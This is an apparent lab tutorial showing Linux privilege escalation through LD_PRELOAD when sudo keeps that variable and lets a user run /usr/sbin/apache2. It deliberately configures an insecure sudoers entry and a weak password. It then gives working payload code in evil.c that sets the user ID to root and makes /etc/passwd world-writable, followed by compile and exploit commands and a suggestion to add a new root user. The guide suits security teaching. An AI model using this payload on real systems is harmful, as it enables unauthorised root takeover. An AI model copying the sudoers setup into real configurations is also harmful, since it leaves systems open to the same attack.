# Privilege Escalation Using LD_PRELOAD and Exploit with apache2

## Overview

  This guide demonstrates how to use the LD_PRELOAD environment variable for privilege escalation on a system running Apache2. It involves creating a malicious shared object (evil.so) that, when loaded with LD_PRELOAD, can allow an unprivileged user to gain root privileges and modify system files like /etc/passwd.

## Prerequisites

  • A Linux-based system (Ubuntu/Debian or similar)

  • The user site-admin has been granted sudo permissions to execute /usr/sbin/apache2

  • The ability to use LD_PRELOAD to load shared libraries before others

## Step 1: Install Apache2 and Configure Permissions

  Start by installing Apache2 and configuring the site-admin user:
      
      # Update the package list and install Apache2
      sudo apt update && sudo apt install apache2
      
      # Add the user 'site-admin' with a home directory and bash shell
      sudo useradd -m site-admin -s /bin/bash
      
      # Install sudo if not already installed
      sudo apt install sudo
      
      # Edit sudoers file to add the necessary privileges
      sudo visudo
  
  In the sudoers file, add the following lines:

      # Keep the LD_PRELOAD environment variable
      Defaults     env_keep += "LD_PRELOAD"
  
      # User privilege specification
      root    ALL=(ALL:ALL) ALL
      site-admin    ALL=(ALL:ALL) NOPASSWD: /usr/sbin/apache2
  
  Set the password for the site-admin user:

        echo 'site-admin:123' | sudo chpasswd

## Step 2: Check sudo Permissions for site-admin
  
      # SSH into the system as site-admin
      ssh site-admin@192.168.2.12
  
      # List sudo privileges for the user
      sudo -l

## Step 3: Exploit Privilege Escalation Using LD_PRELOAD

  **3.1: Create the Malicious Payload (evil.c)**
  
  Create a C file that will escalate privileges when loaded with LD_PRELOAD:

   
          # Create and edit the evil.c file
          vim evil.c
  
  Add the following code to evil.c:
  
          // evil.c - Simple privilege escalation payload
          #include <stdio.h>
          #include <stdlib.h>
          #include <unistd.h>
  
          void __attribute__((constructor)) init() {
              setuid(0);      // Set user ID to root
              setgid(0);      // Set group ID to root
              system("chmod 777 /etc/passwd");  // Change permissions of /etc/passwd
          }

  **3.2: Compile the Malicious Shared Object**

            # Compile the malicious shared object
            gcc -shared -o evil.so -fPIC evil.c


  **3.3: Verify the /etc/passwd File**
 
  Before executing the exploit, check the permissions of the /etc/passwd file:

    ls -lha /etc/passwd

  You should see something like this:

    -rw-r--r-- 1 root root 1.4K Feb 6 01:11 /etc/passwd

  **3.4: Execute the Exploit**
  
  Now, execute the apache2 binary with the malicious shared object loaded via LD_PRELOAD:

    # Execute apache2 with LD_PRELOAD set to the malicious shared object
    sudo LD_PRELOAD=/home/site-admin/evil.so /usr/sbin/apache2 -v

  **3.5: Verify the Exploit**

  After executing the exploit, verify that the permissions of /etc/passwd have been changed:

    ls -lha /etc/passwd

  The permissions should now be:

    -rwxrwxrwx 1 root root 1.4K Feb 6 01:11 /etc/passwd


## Step 4: Modify the /etc/passwd File

  You can now edit /etc/passwd to add a new root user or make other modifications:

      # Open /etc/passwd to make changes
      sudo vim /etc/passwd


# Conclusion

  By exploiting LD_PRELOAD, an attacker can load a malicious shared object and escalate privileges, potentially modifying critical system files like /etc/passwd. This demonstrates the power and danger of environment variables and the need for proper system hardening.

  
  



    
